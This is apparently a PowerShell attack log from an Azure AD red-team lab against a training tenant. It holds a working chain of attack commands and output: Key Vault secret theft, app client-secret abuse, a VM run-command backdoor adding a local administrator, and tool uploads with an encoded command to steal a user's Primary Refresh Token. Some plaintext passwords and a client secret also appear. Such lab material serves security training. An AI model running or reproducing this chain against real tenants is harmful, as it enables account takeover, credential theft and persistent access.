# Module A
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
$AADInternalModulePath = "C:\AzAD\Tools\AADInternals\AADInternals.psd1"
Import-Module $AADInternalModulePath

$AzureADModulePath = "C:\AzAD\Tools\AzureAD\AzureAD.psd1"
Import-Module $AzureADModulePath

$Domain = "defcorphq.onmicrosoft.com"

$TenantId = (Get-AADIntTenantID -Domain defcorphq.onmicrosoft.com)

Cartp-ConnectWithCreds -Username "test@defcorphq.onmicrosoft.com" -Password "..."

Cartp-BasicMgEnum
Cartp-AzEnum



Connect-AzAccount -AccountId $accountid -AccessToken $accessToken -GraphAccessToken $graphtoken -KeyVaultAccessToken $keyvaulttoken
Key Vault: ResearchKeyVault
====================================
Secret Name: Reader
Secret Version:
Secret Value: username: kathynschaefer@defcorphq.onmicrosoft.com ; password: ...


Client secret added to :

Object ID : 35589758-714e-43a9-be9e-94d22fdd34f6
App ID    : f072c4a6-b440-40de-983f-a7f3bd317d8f
App Name  : fileapp


Cartp-ConnectAsServicePrincipal -AppId 'f072c4a6-b440-40de-983f-a7f3bd317d8f' -Password 'JiU8Q~tFxXeShQ~lWmzmx2kOw~xrPkFXtTwqpaiL' -GraphToken $GraphToken


Key Vault: credvault-fileapp
====================================
Secret Name: MobileUsersBackup
Secret Version:
Secret Value: username: DavidDHenriques@defcorphq.onmicrosoft.com ; password: ...
-----------------------------

Template saved at: C:\windows\Temp\deployments\DavidDHenriques_defcorphq.onmicrosoft.com.stagingenv.json
CommandToExecute found in resource: [parameters('vmName')]
Command: $username = "thomasebarlow@defcorpit.onmicrosoft.com";$password="...";$SecurePassword = ConvertTo-SecureString "$password" -AsPlainText -Force;$credentials = New-Object System.Management.Automation.PSCredential($username, $SecurePassword);Login-AzAccount -Credential $credentials;Get-AzureADTenantDetail
------------------------------------

Cartp-CreateAndRunRunbook -RunbookName myrunbookpro1 -RunbookPath 'C:\AzAD\Tools\studentx.ps1' -RunOn Workergroup1

Cartp-RunCommandOnVm -VmName bkpadconnect -ResourceGroupName Engineering -ScriptPath 'C:\AzAD\Tools\adduser.ps1'

Cartp-ConnectVm -VmName bkpadconnect -ResourceGroupName Engineering -Username Huyhekhellostudent13 -Password '...'

Cartp-ConnectWithCreds -Username "kathynschaefer@defcorphq.onmicrosoft.com" -Password "..."

[05:51:07] [+++] [0] Username: [roygcain@defcorphq.onmicrosoft.com]
[05:51:07] [+++] [0] Username: [roygcain@defcorphq.onmicrosoft.com]
[05:51:07] [+++] [0] Password: [R0yGCaiNC@nTrustAny0neEas!ly]

Cartp-SetUserPass  -UserEmail  VMContributor13@defcorphq.onmicrosoft.com -NewPassword ...  -GraphToken $graphToken

Cartp-ConnectWithCreds -Username VMContributor13@defcorphq.onmicrosoft.com -Password "..."

Cartp-RunCommandOnVm -VmName jumpvm -ResourceGroupName RESEARCH -ScriptPath 'C:\AzAD\Tools\adduser.ps1'

$jumpvm = Cartp-ConnectVm -VmName jumpvm -ResourceGroupName RESEARCH -Username Huyhekhellostudent13 -Password '...'
Enter-PSSession $jumpvm

Command: $username = "stevencking@defcorphq.onmicrosoft.com";$password="...";$SecurePassword = ConvertTo-SecureString "$password" -AsPlainText -Force;$credentials = New-Object System.Management.Automation.PSCredential($username, $SecurePassword);Login-AzAccount -Credential $credentials;Get-AzureADTenantDetail
------------------------------------

Cartp-ConnectWithCreds -Username "stevencking@defcorphq.onmicrosoft.com" -Password "..."

$Password = ConvertTo-SecureString '...' -AsPlainText -Force # Pass change
$Cred = New-Object System.Management.Automation.PSCredential('samcgray@defcorphq.onmicrosoft.com', $Password)
Connect-AzAccount -Credential $Cred

Cartp-ConnectWithCreds -Username "samcgray@defcorphq.onmicrosoft.com" -Password "..."

$infrasrv = Cartp-AzVmExtensionsEditCommandToExecute -VmExtensionName infradminsrv/ExecCmd -CommandToExecute 'powershell net users myostudent13 StudxPassword@123 /add /Y; net localgroup administrators myostudent13 /add'
Invoke-Command -Session $infrasrv -ScriptBlock{hostname}
Invoke-Command -Session $infrasrv -ScriptBlock{dsregcmd /status}

Cartp-UploadFileToSession -FilePath C:\AzAD\Tools\ROADToken.exe -Session $jumpvm
Cartp-UploadFileToSession -FilePath C:\AzAD\Tools\PsExec64.exe -Session $jumpvm
Cartp-UploadFileToSession -FilePath C:\AzAD\Tools\SessionExecCommand.exe -Session $jumpvm
Enter-PSSession -Session $jumpvm

Cartp-UploadFileToSession -FilePath C:\Windows\Temp\uploads\ROADToken.exe -Session $infrasrv
Cartp-UploadFileToSession -FilePath C:\Windows\Temp\uploads\PsExec64.exe -Session $infrasrv
Cartp-UploadFileToSession -FilePath C:\Windows\Temp\uploads\SessionExecCommand.exe -Session $infrasrv 

Invoke-Command -Session $infrasrv -ScriptBlock{powershell -enc JABUAGUAbgBhAG4AdABJAGQAIAA9ACAAIgAyAGQANQAwAGMAYgAyADkALQA1AGYANwBiAC0ANAA4AGEANAAtADgANwBjAGUALQBmAGUANwA1AGEAOQA0ADEAYQBkAGIANgAiAAoAJABVAFIATAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBsAG8AZwBpAG4ALgBtAGkAYwByAG8AcwBvAGYAdABvAG4AbABpAG4AZQAuAGMAbwBtAC8AJABUAGUAbgBhAG4AdABJAGQALwBvAGEAdQB0AGgAMgAvAHQAbwBrAGUAbgAiAAoAJABQAGEAcgBhAG0AcwAgAD0AIABAAHsACgAiAFUAUgBJACIAIAA9ACAAJABVAFIATAAKACIATQBlAHQAaABvAGQAIgAgAD0AIAAiAFAATwBTAFQAIgAKAH0ACgAKACQAQgBvAGQAeQAgAD0AIABAAHsACgAiAGcAcgBhAG4AdABfAHQAeQBwAGUAIgAgAD0AIAAiAHMAcgB2AF8AYwBoAGEAbABsAGUAbgBnAGUAIgAKAH0ACgAkAFIAZQBzAHUAbAB0ACAAPQAgAEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAEAAUABhAHIAYQBtAHMAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBCAG8AZAB5ACAAJABCAG8AZAB5AAoAJABSAGUAcwB1AGwAdAAuAE4AbwBuAGMAZQAKAAoA | Out-File -FilePath "C:\Windows\Temp\nonce.txt"}
Invoke-Command -Session $infrasrv -ScriptBlock{C:\Windows\Temp\uploads\PsExec64.exe -accepteula -s "cmd.exe" " /c cd C:\Windows\Temp\uploads\ && SessionExecCommand.exe MichaelMBarron ROADToken.exe $(gc C:\Windows\Temp\nonce.txt) > MichaelMBarron_PRT3.txt"}
Invoke-Command -Session $infrasrv -ScriptBlock{gc C:\Windows\Temp\uploads\MichaelMBarron_PRT3.txt}
